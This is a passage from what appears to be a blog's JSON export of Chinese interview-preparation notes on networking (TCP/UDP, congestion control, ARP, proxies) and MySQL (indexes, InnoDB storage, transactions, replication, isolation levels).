管道传输【一般不使用】：在同一个 TCP 连接里面，客户端可以发起多个请求：只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间 队头阻塞问题：当顺序发送的请求序列中的某个请求阻塞时，后面的请求也会一直被阻塞。2. 传输层UDPUDP头部包含8个字节64位 UDP头部的格式如下： 源端口 (16位)：用于标识发送方的端口号。目标端口 (16位)：用于标识接收方的端口号。长度 (16位)：指示UDP报文头部和数据的总长度，以字节为单位，最小值为8（只有头部）。校验和 (16位)：用于检测UDP报文是否在传输过程中发生了错误。 TCPTCP头部包含20个字节。握手挥手时，数据字段为空 *为什么要进行三次握手 ？确认客户端和服务端都可以正常发送接收数据。 第一次握手：确认客户端可以正常发送数据。 第二次握手：确认客户端可以正常发送数据，确认服务端可以正常接收数据。 第三次握手：确认客户端可以正常发送数据，确认服务端可以正常接收数据，确认服务端可以正常发送数据，客户端可以正常接收数据。三次握手过程中网络断开，会出现什么情况 第一次握手丢失：客户端没收到第二次握手，触发超时重传机制，发送第一次握手第二次握手丢失：客户端依然没收到第二次握手，触发超时重传，发送第一次握手；服务端没有收到第三次握手，超时重传，发送第二次握手第三次握手丢失：客户端establish状态，服务端没有收到第三次握手，超时重传，仍然发送第二次握手 超时重传的限度：发送一定次数N，这个次数由内核限制，linux为5次。 为什么要进行四次挥手 ？第一次挥手：客户端向服务端请求关闭连接。 客户端：客户端无数据传输。 服务端：无感知。 第二次挥手：服务端收到客户端的请求，并且告知客户端等我处理完毕数据。 客户端：客户端无数据传输。 服务端：客户端无数据传输。 第三次挥手：服务端处理完毕数据，告知客户端，服务端数据处理完毕。 客户端：客户端无数据传输，服务端无数据传输。 服务端：客户端无数据传输，服务端无数据传输。 第四次挥手：客户端得知服务端数据处理完毕，双方数据都处理完毕，可断开连接。 客户端：客户端无数据传输，服务端无数据传输。 服务端：客户端无数据传输，服务端无数据传输，得知客户端知道服务端无数据传输。 *TCP是如何保证可靠传输的1 数据分块​ 应用数据被分割成 TCP 认为最适合发送的数据块。并且给每一个数据块进行编号，在传输的过程中，每次接收方收到数据后，都会对传输方进行确认应答，即发送 ACK 报文，这个 ACK 报文当中带有对应的确认序列号，如果发送过程中，存在数据块丢失或者发送重复，接收方根据序列号整理数据块，删除重复的数据块，要求发送方重新发送丢失的数据块。 2 校验和与UDP 校验和相同，监测数据传输过程中可能出现的差错。 3 流量控制让发送方的发送速率不要太快，让接收方来得及接收，TCP 连接的双方都有一个固定大小的缓冲空间，发送方发送的数据量不能超过接收端缓冲区的大小。当接收方来不及处理发送方的数据，会提示发送方降低发送的速率，防止产生丢包。TCP 通过滑动窗口协议来支持流量控制机制。 4 ARQ协议ARQ(Automatic Repeat-reQuest)自动重传协议：每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。 5 超时重传当 TCP 发出一个报文段后，它启动一个定时器，等待目的端确认收到这个报文段。如果超过某个时间还没有收到确认，将重发这个报文段。 6 拥塞控制在实际的网络通信系统中，除了发送方和接收方外，还有路由器，交换机等复杂的网络传输线路，此时就需要拥塞控制。拥塞控制是作用于网络的，它是防止过多的数据注入到网络中，避免出现网络负载过大的情况。常用的解决方法有：慢开始和拥塞避免、快重传和快恢复。 慢开始：当发送方开始发送数据时，由于一开始不知道网络负荷情况，如果立即将大量的数据字节传输到网络中，那么就有可能引起网络拥塞。一个较好的方法是在一开始发送少量的数据先探测一下网络状况。慢开始的慢指的是初始发送报文段的数量为 1，如果收到确认，则发送两个报文段，之后每收到一个确认报文，发送报文端的数量就翻倍，直到到达慢开始门限，当发送报文段的数据大于门限数量时，使用拥塞避免算法。拥塞避免：当网络拥塞发生时，慢开始门限值减半，发送的报文段数量改变为 1 ,然后再次重复两种算法（慢开始和拥塞避免）。快重传：接收方每收到一个失序的报文就立即发送重复确认，而不要等到自己发送数据时才捎带进行确认，假定发送方发送了 Msg 1 ~ Msg 4 这 4 个报文，已知接收方收到了 Msg 1，Msg 3 和 Msg 4 报文，此时因为接收到收到了失序的数据包，按照快重传的约定，接收方应立即向发送方发送 Msg 1 的重复确认。 于是在接收方收到 Msg 4 报文的时候，向发送方发送的仍然是 Msg 1 的重复确认。这样，发送方就收到了 3 次 Msg 1 的重复确认，于是立即重传对方未收到的 Msg 报文。由于发送方尽早重传未被确认的报文段，因此，快重传算法可以提高网络的吞吐量。 快恢复 快恢复算法是和快重传算法配合使用的，该算法主要有以下两个要点： ① 当发送方连续收到三个重复确认，执行乘法减小，慢开始门限值减半； ② 由于发送方可能认为网络现在没有拥塞，因此与慢开始不同，发送报文段的数量减半，然后执行拥塞避免算法，线性增加发送报文段的数量。 quic协议QUIC(Quick UDP Internet Connections)，是一种基于 UDP 的传输层协议。QUIC = HTTP/2 + TLS + UDP. 3. 网络层IPA 类地址：10.0.0.0～10.255.255.255B 类地址：172.16.0.0～172.31.255.255C 类地址：192.168.0.0～192.168.255.255解决IPv4不够用的两种技术： nat(network address translation)网络地址转换协议：将内网地址转为公网ip的协议，实现多层网络地址转换。 IPv6 128位，比IPv4的32位多了四倍链路层ARP协议arp(address resolution protocol) 地址解析协议：根据主机的ip 地址获取主机的mac 地址。每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。 A要发送B一个数据包，首先他有B的IP地址，为了发送成功还需要B的MAC地址。 首先A查找本地ARP缓存，IP：MAC的映射 如果找到MAC 地址，就可以发送消息。 如果没有，A就会发送一个局域网广播的ARP请求B的MAC的数据包，这个消息被局域网内所有的计算机接受，B返回一个包含自身MAC和IP地址的ARP响应消息。作为响应请求的一部分，B 可以将 A 的一个条目插入到它的 ARP 表中，以备将来使用。 MAC地址 MAC 地址是数据链路层和物理层使用的地址，是写在网卡上的物理地址。MAC 地址用来定义网络设备的位置。 IP 地址是网络层和以上各层使用的地址，是一种逻辑地址。IP 地址用来区别网络上的计算机。互联网中主机之间相互传递数据的逻辑是，先通过 ip 地址找到对应的局域网，然后再找到对应的主机。 如果只采用 ip 地址，不用mac 地址：不安全， 同一个ip 地址可能绑定多个主机，而无论何时mac 地址和主机是一一对应的。 找不到主机号，IP本质上相当于逻辑地址，两个主机可能有一个IP 如果只采用mac 地址，不用ip 地址：没有办法使用ip 通过网段寻找目标主机，需要在全网段内没有规律的找一个主机，效率太慢。 一个是不够用，二是没有IP网段，全网查找，没有规律 WebSocket 使用最广泛的HTTP/1.1，也是基于TCP协议的，同一时间里，客户端和服务器只能有一方主动发数据，这就是所谓的半双工。 1. 正向代理和反向代理 正向代理是为了隐藏客户端信息例如ip，反向代理是为了隐藏服务器信息，例如ip。 正向代理是有感知的（就是说你需要用vpn你需要自己去配置），反向代理是无感知的（只需要输入www.baidu.com就可以访问到百度不同服务器上的资源，配置过程不是用户去做的）。","categories":[{"name":"Network","slug":"Network","permalink":"http://waynamigo.github.io/categories/Network/"}],"tags":[{"name":"network","slug":"network","permalink":"http://waynamigo.github.io/tags/network/"},{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"}]},{"title":"MySQL questions","slug":"2023-01-03-面经MySQL问题","date":"2023-01-02T16:00:00.000Z","updated":"2023-12-02T09:46:21.665Z","comments":true,"path":"2023/01/03/2023-01-03-面经MySQL问题/","link":"","permalink":"http://waynamigo.github.io/2023/01/03/2023-01-03-面经MySQL问题/","excerpt":"questions","text":"questions mysql货币使用什么类型Numeric和Decimal explain使用 查询优化器 对语句进行分析，找出最优的查询方案，并显示对应的信息。explain的字段有哪些【主要看 type key rows extra】 id 查询序号 select_type 查询类型 table 表名 partitions 匹配的分区 type(主要) 查询使用了什么类型，是index还是全表扫描，同时用了index还会在extra里显示using index 1system --&gt; const --&gt; eq_ref --&gt; ref --&gt; fulltext --&gt; ref_or_null --&gt; index_merge --&gt; unique_subquery --&gt; index_subquery --&gt; range --&gt; index --&gt; ALL prossible_keys 可能会选择的索引 key（主要） 实际选择的索引 key_len 索引的长度 ref 与索引作比较的列 rows（主要） 要检索的行数(估算值) filtered 查询条件过滤的行数的百分比 Extra（主要） 额外信息，dictinct，using index，using filesort，using temporary，最好是using index，filesort和tmp都可能导致性能下降 select type有哪些1234567891011SIMPLE 简单SELECT(不使用UNION或子查询)PRIMARY 最外层的SELECTUNION UNION中第二个或之后的SELECT语句DEPENDENT UNION UNION中第二个或之后的SELECT语句取决于外面的查询UNION RESULT UNION的结果SUBQUERY 子查询中的第一个SELECTDEPENDENT SUBQUERY 子查询中的第一个SELECT, 取决于外面的查询DERIVED 衍生表(FROM子句中的子查询)MATERIALIZED 物化子查询UNCACHEABLE SUBQUERY 结果集无法缓存的子查询，必须重新评估外部查询的每一行UNCACHEABLE UNION UNION中第二个或之后的SELECT，属于无法缓存的子查询 2. 慢查询怎么排查 看慢查询日志，cat slow_query.log 找到的话用explain，查看他的type，是否using index，最差可能时all（扫全表），keys用了哪些索引，rows的估计值 其他数据库mongodb(https://www.chaojimake.cn/question_8_88.html)mongodb索引使用了B树，https://mp.weixin.qq.com/s/mMWdpbYRiT6LQcdaj4hgXQhbase(https://www.chaojimake.cn/question_8_349.html) 为什么要分库如果业务量剧增，数据库可能会出现性能瓶颈，这时候我们就需要考虑拆分数据库。 磁盘存储业务量剧增，MySQL单机磁盘容量会撑爆，拆成多个数据库，磁盘使用率大大降低。 并发连接支撑知道数据库连接数是有限的（150个？）。在高并发的场景下，大量请求访问数据库，MySQL单机是扛不住的！高并发场景下，会出现too many connections报错。 当前非常火的微服务架构出现，就是为了应对高并发。它把订单、用户、商品等不同模块，拆分成多个应用，并且把单个数据库也拆分成多个不同功能模块的数据库（订单库、用户库、商品库），以分担读写压力。 为什么要分表假如你的单表数据量非常大，存储和查询的性能就会遇到瓶颈了，如果你做了很多优化之后还是无法提升效率的时候，就需要考虑做分表了。一般千万级别数据量，就需要分表。这是因为即使SQL命中了索引，如果表的数据量超过一千万的话，查询也是会明显变慢的。这是因为索引一般是B+树结构，数据千万级别的话，B+树的高度会增高，查询就变慢啦 考虑分库分表的时机一般数据量千万级别，B+树索引高度就会到3层以上了，查询的时候会多查磁盘的次数，SQL就会变慢。 阿里巴巴的《Java开发手册》提出：单表行数超过500万行或者单表容量超过2GB，才推荐进行分库分表那我们是不是等到数据量到达五百万，才开始分库分表呢？不是这样的，我们应该提前规划分库分表，如果估算3年后，你的表都不会到达这个五百万，则不需要分库分表。MySQL服务器如果配置更好，是不是可以超过这个500万这个量级，才考虑分库分表？虽然配置更好，可能数据量大之后，性能还是不错，但是如果持续发展的话，还是要考虑分库分表一般什么类型业务表需要才分库分表？通用是一些流水表、用户表等才考虑分库分表，如果是一些配置类的表，则完全不用考虑，因为不太可能到达这个量级。 如何分库分表？原则有哪些数据库垂直切分数据库水平切分一定规则分库分表的取模算法分库分表的范围限定算法分库后，事务问题如何解决分表后，跨节点的join和union问题分库分表后，orderby groupby等聚合函数如何处理分库分表后，分页的处理方案如何生成全局唯一的分布式ID主流分库分表中间件分表要停服吗，不停服怎么做为了避免数据热点问题如何选择分表策略阐述常用的数据库中间件基础问题1. 数据类型 int：tinyint(1byte) smallint(2byte) mediumint(3byte) int(4byte) bigint(8byte) float,double decimal 字符串类型：varchar,char,text,blob varchar(n):n代表字符个数，不是字节个数 char与varchar的区别 char定长，var不定长，存储效率较高 varchar在开头两个字节存长度 text 和blob会使用临时表，开销损失大 【Tips】经常变更的数据使用char，char不容易产生碎片时间类型 date timestamp（优先使用，空间开销小） 3. 数据库三大范式 ，范式和反范式是什么【】 第一范式（1NF）：每个列都不可以再拆分，强调的是列的原子性。第一范式要求数据库中的表都是二维表。 第二范式（2NF）：在第一范式的基础上，一个表必须有一个主键，非主键列 完全依赖 于主键，而不能是依赖于主键的一部分。 第三范式（3NF）：在第二范式的基础上，非主键列只依赖（直接依赖）于主键，不依赖于其他非主键。 范式：范式化的表减少了数据冗余，数据表更新操作快、占用存储空间少。 但是查询时通常需要多表关联查询，更难进行索引优化 反范式：反范式的过程就是通过冗余数据来提高查询性能，可以减少表关联和更好进行索引优化 存在大量冗余数据，并且数据的维护成本更高 索引问题1.索引的分类2.索引优缺点3.索引设计原则 唯一性 经常与其他表链接的表，在链接字段应创建索引 on 两边的字段，都要建立索引 经常出现在where子句中的字段，尤其是大表，应创建索引 索引应创建在选择性高，重复度低的字段上，如员工表，姓名和性别都作为查询条件，姓名更适合建立索引。如果两个同时建立了索引，MySQL也会自动选择以姓名作为索引查询 索引应该建立在小字段上，对于大的文本甚至超长字段，尽量不建立索引 复合索引① 正确选择复合索引中的主列字段，一般是选择性较好的字段② 复合索引的几个字段是否经常同时以AND方式出现在Where子句中？单字段查询是否极少甚至没有？ 如果是，则可以建立复合索引；否则考虑单字段索引③ 如果复合索引中包含的字段经常单独出现在Where子句中，则分解为多个单字段索引④ 如果既有单字段索引，又有这几个字段上的复合索引，一般可以删除复合索引 选哪些列建立索引的原则是什么 字段不为null，唯一性，不频繁更新的，需要经常作为where orderby join的条件的字段做索引 不应该给频繁更新的字段维护索引 尽量考虑建立联合索引，并避免冗余 字符串的索引用前缀表示 单张表索引不超过 5 个4.索引的b+树5.hash索引和b+索引的区别6.为什么b+树打败了二叉查找树和b树7.最左匹配原则8.覆盖索引9.索引下推存储引擎InnoDB 适用于？MyISAM 适用以插入为主的程序，比如博客系统、新闻门户 1.存储引擎InnoDB的四大特性插入缓冲（insert buffer)二次写(double write)自适应哈希索引(ahi)预读(read ahead) 2.MyISAM和InnoDB的区别 InnoDB 支持事务，而 MyISAM 不支持。 InnoDB 支持外键，而 MyISAM 不支持。因此将一个含有外键的 InnoDB 表 转为 MyISAM 表会失败。 InnoDB 和 MyISAM 均支持 B+ Tree 数据结构的索引。但 InnoDB 是聚集索引，而 MyISAM 是非聚集索引。 InnoDB 不保存表中数据行数，执行 select count(*) from table 时需要全表扫描。而 MyISAM 用一个变量记录了整个表的行数，速度相当快（注意不能有 WHERE 子句）。 那为什么 InnoDB 没有使用这样的变量呢 因为InnoDB的事务特性，在同一时刻表中的行数对于不同的事务而言是不一样的。 InnoDB 支持表、行（默认）级锁，而 MyISAM 支持表级锁。InnoDB 的行锁是基于索引实现的，而不是物理行记录上。即访问如果没有命中索引，则也无法使用行锁，将要退化为表锁。 InnoDB 必须有唯一索引（如主键），如果没有指定，就会自动寻找或生产一个隐藏列 Row_id 来充当默认主键，而 Myisam 可以没有主键。 3.为何推荐使用自增主键自增 ID 可以保证每次插入时 B+ 树索引是从右边扩展的，因此相比自定义 ID （如 UUID）可以避免 B+ 树的频繁合并和分裂。如果使用字符串主键和随机主键，会使得数据随机插入，效率比较差。 存储结构1.页Page，区Extend，段Segment 页（数据页）：InnoDB中每个页16KB，Myisam是1KB 一行数据大于16kb，会发生什么，怎么解决【行溢出问题】内置的解决方式：将溢出的数据存到新页里，然后原始页里存放一个指针，需要额外一次IO去读取 聚簇索引情况： 如果表使用了聚簇索引（InnoDB的主键索引就是一个聚簇索引），那么数据行实际上是存储在聚簇索引的叶子节点中的。如果一行数据超出了页的大小，那么会发生行溢出，溢出部分会存储在一个溢出页中，而叶子节点中仍然包含原始行的数据和指向溢出页的指针。 非聚簇索引情况： 如果表使用了非聚簇索引（如普通索引），那么数据行是单独存储在聚簇索引的叶子节点之外的，这种情况下，如果一行数据超出了页的大小，会直接发生行溢出，溢出部分会存储在溢出页中，同时非聚簇索引中也会保留指向溢出页的指针。 区Extent：一个区默认是 64 个连续的页组成的，也就是 1MB 段Segment：一段相邻的区的集合，逻辑上的组织，存放b+树 2.页由哪些数据组成 file header:用于描述数据页的外部信息，比如属于哪一个表空间、前后页的页号等 page header:用来描述数据页中的具体信息，比如存在多少条纪录，第一条纪录的位置等。 infimum 和 supremum 纪录:是系统生成的纪录，分别为最小和最大纪录值，infimum 的下一条是用户纪录中键值最小的纪录，supremum 的上一条是用户纪录中键值最大的纪录，通过 next_record 字段来相连。 user records:据库表中对应的数据(Compact行格式) free space 可插入的空闲区域 page dictionary：类似于字典的目录结构，根据主键大小，每隔 4-8 个纪录设置一个槽，用来纪录其位置，当根据主键查找数据时，首先一步到位找到数据所在的槽，然后在槽中线性搜素。这种方法比从前到后遍历页的链表的效率更快。 File Header：存储刷盘前内存的校验和，Page Tailer储存刷盘后的校验和。当刷盘的时候，出现异常，Page Tailer和File Header中的校验和不一致，则说明出现刷盘错误。 3.页插入记录的过程1）如果 Free Space 的空间足够的话，直接分配空间来添加纪录，并将插入前最后一条纪录的 next_record 指向当前插入的纪录，将当前插入纪录的 next_record 指向 supremum 纪录。 2）如果 Free Space的 空间不够的话，则首先将之前删除造成的碎片重新整理之后，按照上述步骤插入纪录。 3）如果当前页空间整理碎片之后仍然不足的话，则重新申请一个页，将页初始化之后，按照上述步骤插入纪录 4.bufferPoolBuffer Pool 是 InnoDB 存储引擎层的缓冲池，不属于 MySQL 的 Server 层，注意跟 8.0 删掉的“查询缓存”功能区分。 内存中以页（page）为单位缓存磁盘数据，减少磁盘IO，提升访问速度。缓冲池大小默认 128M，独立的 MySQL 服务器推荐设置缓冲池大小为总内存的 80%。主要存储数据页、索引页更新缓冲（change buffer）等。 5.change buffer​如果每次写操作，数据库都直接更新磁盘中的数据，会很占磁盘IO。为了减少磁盘IO，InnoDB在Buffer Pool中开辟了一块内存，用来存储变更记录，为了防止异常宕机丢失缓存，当事务提交时会将变更记录持久化到磁盘（redo log），等待时机更新磁盘的数据文件（刷脏），用来缓存写操作的内存，就是Change Buffer Change Buffer默认占Buffer Pool的25%，最大设置占用50%。 InnoDB1.架构设计【内存、线程】 内存数据区域划分 四大线程 Master thread IO thread Purge thread Page Cleaner Thread 1）负责刷新内存池中的数据，保证缓冲池的内存缓冲的是最近的数据 2）已修改的数据文件刷新到磁盘文件 3）保证数据库发生异常的情况下InnoDB能恢复到正常状态 2.InnoDB有哪些线程 Master Thread 负责将缓冲池中的数据异步刷新到磁盘，保证数据的一致性，包括脏页的刷新，合并插入缓冲（INSERT BUFFER），UNDO页的回收等。 IO Thread 负责 AIO 请求的回调处理。 Purge Thread 事务提交后，undo log 可能不再需要，由 Purge Thread 负责回收并重新分配的这些已经使用的 undo 页。 Page Cleaner Thread 将Master Threader中刷新脏页的工作移至该线程，如上面说的FLUSH LRU LIST Checkpoint以及Async/Sync Flush Checkpoint。 3.double writer是什么4. 自适应hash是什么InnoDB 会监控对表上各索引页的查询执行情况，如发现建立哈希索引可以提升速度，则建立哈希索引，这是过程不需要用户干预。（默认开启） 事务1.什么是事务事务是逻辑上的一组操作，要么都执行，要么都不执行 2.什么是事务的四大特性ACID3.事务的并发问题【带来脏读、不可重复度、幻读问题】5.事务的隔离级别串行化可重复度（Innodb默认）读已提交读未提交 6.ACID的特性如何实现原子性是 undo 日志持久性是 redo 日志 锁1.数据库锁的特性，有哪些锁 行锁，表锁，页锁， 共享锁=读锁S，排他锁=写锁X，更新锁U锁 乐观锁，悲观锁2.隔离级别和锁的关系 InnoDB 的行锁是基于索引实现的，而不是物理行记录上。即访问如果没有命中索引，则也无法使用行锁，将要退化为表锁。3.InnoDB的锁算法4.快照读和当前读5.innodb的可重复度如何实现通过MVCC实现，为每个事务维护一个独立版本视图，执行期间保持一致性。6.MVCC以及实现（乐观锁）MVCC 的基本思想是为每个事务创建一个独立的版本视图，以便在事务执行期间保持数据的一致性。它通过在修改数据时不覆盖原有的数据，而是为每个事务创建一个新的版本来实现。 每行数据保存一个版本号/时间戳 当一个事务对某行数据进行修改时，不会直接修改原始数据，而是会在数据库中创建一个新的版本，并将原始版本的数据保留下来 查询时，根据版本号7. mysql优化手段有哪些 给常用字段索引，使用覆盖索引的时候，最左原则，避免全表扫描 避免not in ，范围查询使用between 分表分区，拆分子表，规模大的时候拆一下insert和update等 使用覆盖索引：索引覆盖是指查询的列都包含在索引中，而无需再去访问表本身，可以减少IO和提高查询性能。不适合频繁变更的表和列 redis缓存分担压力 连接池等 集群1.mysql的常见日志 binlog 记录mysql的写入信息和操作，追加的方式写入，用于主从复制和数据恢复。 12345678主从复制：在Master端开启binlog，然后将binlog发送到各个Slave端，Slave端重放binlog从而达到主从数据一致。数据恢复：通过使用mysqlbinlog工具来恢复数据。刷盘时机：sync_binlog参数控制biglog的刷盘时机，取值范围是0-N： 0：不去强制要求，由系统自行判断何时写入磁盘； 1：每次commit的时候都要将binlog写入磁盘； N：每N个事务，才会将binlog写入磁盘。有三种格式，分别为STATMENT、ROW和MIXED undolog实现回滚，保证原子性的，实现的MVCC多版本并发控制。是在操作任何数据之前，首先将数据备份到一个地方（这个存储数据备份的地方称为UndoLog）。然后进行数据的修改。如果出现了错误或者用户执行了ROLLBACK语句，系统可以利用Undo Log中的备份将数据恢复到事务开始之前的状态。 1234刷盘时机 有三种：每秒刷盘，每次事务提交的时候刷盘延迟写，每秒刷盘实时写，实时刷 每次事务提交刷盘实时写，延迟刷 每秒刷盘 redolog用于持久化新数据的备份，用于恢复数据库用的。引入redolog的原因是undolog缺点：每个事务提交前将数据和Undo Log写入磁盘，这样会导致大量的磁盘IO，因此性能很低。如果能够将数据缓存一段时间，就能减少IO提高性能。但是这样就会丧失事务的持久性。因此引入了另外一种机制来实现持久化，即Redo Log。 2.主从复制的方法， 4.主从复制的原理，5.主从复制的异步复制和半同步1 同步复制:所谓的同步复制，意思是master的变化，必须等待slave-1,slave-2,…,slave-n完成后才能返回。这样，显然不可取，也不是MySQL复制的默认设置。比如，在WEB前端页面上，用户增加了条记录，需要等待很长时间。 2 异步复制:结构一般是链式或者树形的结构去发binlog进行复制，至于slaves是否收到二进制日志，是否完成操作，不用关心,MySQL的默认设置。 3 半同步复制:master只保证slaves中的一个操作成功，就返回，其他slave不管。这个功能，是由google为MySQL引入的 存在一个主从延迟的问题，产生的原因是需要复制的节点IO线程跟不上binlog的内容，解决方法一般是多个worker并行复制去做relaylog， 【重点】项目是怎么知道哪个mysql节点有哪些表的，如何控制请求向哪个节点查询 mysql主节点提供一个系统表，jdbc直接连的话，可以通过查询主节点的系统表获取集群的表信息 微服务常用一些组件来做服务发现，进行请求的分发和负载均衡，比如可以接入consul管理mysql集群信息，etcd也可以维护mysql节点的信息。应用程序可以查询服务注册中心，获取数据库节点的地址和表信息。这样，可以动态地发现数据库节点，并知道每个节点上有哪些表3.主从复制的架构【并行复制】https://developer.aliyun.com/article/990898#:~:text=常用的主从同步延迟解决方案：%20🥖强制读主库%20🥖延迟读,🥖降低并发%20🥖并行复制%20%28推荐%29 主库将数据库中数据的变化写入到 binlog 从库创建一个 I/O 线程向主库请求更新的 binlog 主库会创建一个 binlog dump 线程来发送 binlog ，从库中的 I/O 线程负责接收 从库的 I/O 线程将接收的 binlog 写入到 relay log 中。 从库读取 relay log 同步数据本地 现在常用一种并行复制的方式去做，是在从节点用多worker去relaylog，解决主从延迟的问题 6.主从的常见问题和解决方式主从延迟问题，不一致性问题https://zhuanlan.zhihu.com/p/642614348 语法1.Where和Having的区别 WHERE 用于过滤行，出现在 FROM 子句之后。 HAVING 用于过滤分组后的结果，出现在 GROUP BY 子句之后。 在没有分组的情况下，WHERE 和 HAVING 的作用相似，但在存在 GROUP BY 子句时，HAVING 是唯一能够过滤聚合结果的地方。 2.In 和 Exists的区别 IN 用于匹配值是否在给定的值列表中，而 EXISTS 用于检查是否存在满足条件的子查询结果。 IN 通常用于对列的直接比较，而 EXISTS 通常用于与子查询结合，检查子查询是否有结果。 相对来说经常用exist去子查询，优化器执行是会使用索引去匹配，而in会扫描全表3. Union和Union ALL的区别 Union自己去重，union all会包含重复的列，一般是unionall之后在业务里去重 4. Drop Delete Truncate的区别SQL优化1. 如何判断是否走了索引2. 索引失效的几种情况3. where子句如何优化4. 超大分页和深度分页5. 大表查询如何优化 使用覆盖索引：索引覆盖是指查询的列都包含在索引中，而无需再去访问表本身，可以减少IO和提高查询性能。不适合频繁变更的表和列 按照列进行垂直分割，将冷热数据分开存储，以降低查询的数据量 对大表进行分区，将数据划分为更小的物理单元，以减少查询时需要扫描的数据量。 根据查询的条件，选择合适的分区键。 其他1.存储过程（procedure）和函数的区别2.视图是什么3.Trigger是什么","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://waynamigo.github.io/categories/Mysql/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Mysql","slug":"Mysql","permalink":"http://waynamigo.github.io/tags/Mysql/"}]},{"title":"MySQL","slug":"2023-01-03-面经MySQL","date":"2023-01-02T16:00:00.000Z","updated":"2023-12-02T04:43:08.364Z","comments":true,"path":"2023/01/03/2023-01-03-面经MySQL/","link":"","permalink":"http://waynamigo.github.io/2023/01/03/2023-01-03-面经MySQL/","excerpt":"questions","text":"questions mysql分为哪些层，各用来干嘛的 mysql架构共分为两层：Server 层和存储引擎层 Server 层负责建立连接、分析和执行 SQL 存储引擎层负责数据的存储和提取为什么mysql用b+树而不是用b树：查询性能和顺序遍历的效率高主要的原因可能就是b+数据存在叶子节点上，并且用指针连着，如果要遍历直接去扫一遍，而b树的话，需要遍历整棵树才能读完；并且查找时，b+树高度一般很稳定，b树高度一般来说会更高，因为两者的mysql基于什么协议传输TCP。三次握手建立后，连接器验证用户名和密码。 连接器作用 TCP三次握手 校检用户名密码，返回用户权限 查询缓存作用 select语句输入，执行，先去查询缓存中找，查询缓存中存的是之前执行过的sql语句，以key-value保存的，底层数据结构为哈希表。 8.0.3后移除了这一层，在一些问题，包括性能问题、锁的竞争问题以及难以扩展。 解析器作用 词法分析-语法分析-语法树结构 词法分析（Lexical Analysis） 语法分析（Syntax Analysis）语法分析器会将其转化为一个抽象语法树（AST） AST的作用：编译器或解释器用来理解代码含义的数据结构，它可以被后续的步骤用来进行语义分析、优化和生成目标代码等。 【查询优化】：对AST进行查询优化，选择合适的索引和决定连接顺序 【面试题】执行一条 SQL 查询语句，期间发生了什么？ 连接器：建立连接，管理连接、校验用户身份； 查询缓存：查询语句如果命中查询缓存则直接返回，否则继续往下执行。MySQL 8.0 已删除该模块； 解析 SQL，通过解析器对 SQL 查询语句进行词法分析、语法分析，然后构建语法树，方便后续模块读取表名、字段、语句类型； 执行 SQL：执行 SQL 共有三个阶段： prepare 预处理阶段：检查表或字段是否存在；将 select * 中的 * 符号扩展为表上的所有列。 optimize 优化阶段：基于查询成本的考虑， 选择查询成本最小的执行计划； execute 执行阶段：根据执行计划执行 SQL 查询语句，从存储引擎读取记录，返回给客户端； 如何查看我的sql被几个客户端链接了show processlist;会有ID user host等字段 mysql推荐使用长链接，但会产生的问题：随着长连接一直不释放，内存占用大。【解决方式】定期释放，主动重置连接mysql_reset_connection() MYSQL的数据存储方式 show variable like ‘datadir’; 可以查找mysql的文件在哪123db.opt 用来存储当前数据库的默认字符集和字符校验规则。t_order.frm 存放表结构，在 MySQL 中建立一张表都会生成一个.frm 文件，该文件是用来保存每个表的元数据信息的，主要包含表结构定义。t_order.ibd 存放表数据。表数据既可以存在共享表空间文件（文件名：ibdata1）里，也可以存放在独占表空间文件（文件名：表名字.ibd）。 表空间文件的结构表空间由段（segment）、区（extent）、页（page）、行（row）组成 表中的数据在Page里，数据是按「页」为单位来读写的，当需要读一条记录的时候，并不是将这个行记录从磁盘读出来，而是以页为单位，将其整体读入内存。 默认每个页的大小为 16KB，也就是最多能保证 16KB 的连续存储空间 按区分配空间的情况 在表中数据量大的时候，为某个索引分配空间的时候就不再按照页为单位分配了，而是按照区（extent）为单位分配。每个区的大小为 1MB，对于 16KB 的页来说，连续的 64 个页会被划为一个区，这样就使得链表中相邻的页的物理位置也相邻，就能使用顺序 I/O 了。 段一般分为数据段、索引段和回滚段等。 索引段：存放 B + 树的非叶子节点的区的集合； 数据段：存放 B + 树的叶子节点的区的集合； 回滚段：存放的是回滚数据的区的集合，之前讲事务隔离 (opens new window)的时候就介绍到了 MVCC 利用了回滚段实现了多版本查询数据。 Innodb的行格式InnoDB 提供了 4 种行格式，分别是 Redundant、Compact、Dynamic和 Compressed 行格式。 COMPACT 行格式 数据类型：char 是定长的，varchar 是变长的，变长字段实际存储的数据的长度（大小）不固定的。 row_id：如果我们建表的时候指定了主键或者唯一约束列，那么就没有 row_id 隐藏字段了。如果既没有指定主键，又没有唯一约束，那么 InnoDB 就会为记录添加 row_id 隐藏字段。row_id不是必需的，占用 6 个字节。 trx_id：事务id，表示这个数据是由哪个事务生成的。 trx_id是必需的，占用 6 个字节。 roll_pointer：这条记录上一个版本的指针。roll_pointer 是必需的，占用 7 个字节 NULL值列表：用位图存储的。压缩行存储通过一种称为”Dynamic Prefix”的技术，动态地存储每一行的前缀信息和 NULL 列的位图。这使得它可以更加高效地存储具有大量 NULL 列的行。 mysql读取时的几个情况 脏读：读到其他事务未提交的数据； 不可重复读：前后读取的数据不一致； 幻读：前后读取的记录数量不一致。 12345不可重复读的重点是修改，幻读的重点在于新增或者删除。例1（同样的条件, 你读取过的数据, 再次读取出来发现值不一样了 ）：事务1中的A先生读取自己的工资为 1000的操作还没完成，事务2中的B先生就修改了A的工资为2000，导致A再读自己的工资时工资变为 2000；这就是不可重复读。例2（同样的条件, 第1次和第2次读出来的记录数不一样 ）：假某工资单表中工资大于3000的有4人，事务1读取了所有工资大于3000的人，共查到4条记录，这时事务2 又插入了一条工资大于3000的记录，事务1再次读取时查到的记 录就变为了5条，这样就导致了幻读。 脏读: A事务读取到了B事务未提交的内容,而B事务后面进行了回滚. 不可重复读: 当设置A事务只能读取B事务已经提交的部分,会造成在A事务内的两次查询,结果竟然不一样,因为在此期间B事务进行了提交操作. 幻读: A事务读取了一个范围的内容,而同时B事务在此期间插入了一条数据.造成”幻觉”. mysql四种隔离级别 Serializable (串行化) :可避免脏读、不可重复读、幻读的发生。 Repeatable read (可重复读) :可避免脏读、不可重复读的发生。 Read committed (读已提交) :可避免脏读的发生。 Read uncommitted (读未提交) 